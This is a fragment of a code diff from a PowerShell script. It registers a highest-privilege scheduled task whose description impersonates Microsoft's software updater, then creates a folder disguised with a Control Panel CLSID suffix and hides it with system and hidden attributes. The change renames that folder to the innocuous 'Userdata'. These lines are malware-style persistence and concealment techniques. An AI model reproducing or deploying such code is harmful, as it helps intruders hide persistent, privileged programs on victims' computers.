@@ -21,7 +21,7 @@ $task_desc = "Keeps your Microsoft software up to date. If this task is disabled
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
 
-$rdir = "$env:userprofile\150F4013"
+$rdir = "$env:userprofile\Userdata"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
